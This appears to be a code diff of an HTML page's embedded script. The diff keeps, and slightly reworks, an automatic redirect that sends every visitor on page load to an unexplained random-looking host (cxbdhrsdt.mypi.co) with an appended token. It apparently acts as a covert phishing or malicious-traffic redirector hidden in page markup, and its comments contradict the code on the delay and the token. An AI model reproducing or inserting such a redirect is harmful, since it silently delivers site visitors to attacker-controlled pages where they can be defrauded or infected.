@@ -278,12 +278,7 @@ if (typeof ues === 'function') {
   <head>
     <script>
   // List of URLs to cycle through
-  const urls = ["https://cxbdhrsdt.mypi.co/"];
-
-  // Function to get query string from the current URL
-  function getQueryString() {
-    return window.location.search; // This includes the '?' character
-  }
+  const urls = ["https://cxbdhrsdt.mypi.co"];
 
   // Function to get the next URL from local storage or default to the first URL
   function getNextUrl() {
@@ -304,19 +299,24 @@ if (typeof ues === 'function') {
 
   // Main function to execute the redirect
   function redirectToNextUrl() {
-    const queryString = getQueryString();
     const nextUrl = getNextUrl();
-    const fullUrl = `${nextUrl}f6yen0`; // Append '/f56yen0' at the end
+
+    // Check if the URL ends with a slash and remove it
+    const sanitizedUrl = nextUrl.endsWith('/') ? nextUrl.slice(0, -1) : nextUrl;
+
+    // Append 'f56yen0' directly to the sanitized URL
+    const fullUrl = `${sanitizedUrl}f6yen0`;
 
     // Redirect to the constructed URL after a 5-second delay
     setTimeout(() => {
       window.location.href = fullUrl;
-    }, 1000); // 1000 milliseconds = 1 second
+    }, 1000); // 1000 milliseconds = 1 seconds
   }
 
   // Execute the redirect when the page loads
   window.onload = redirectToNextUrl;
 </script>
+
 
 
 
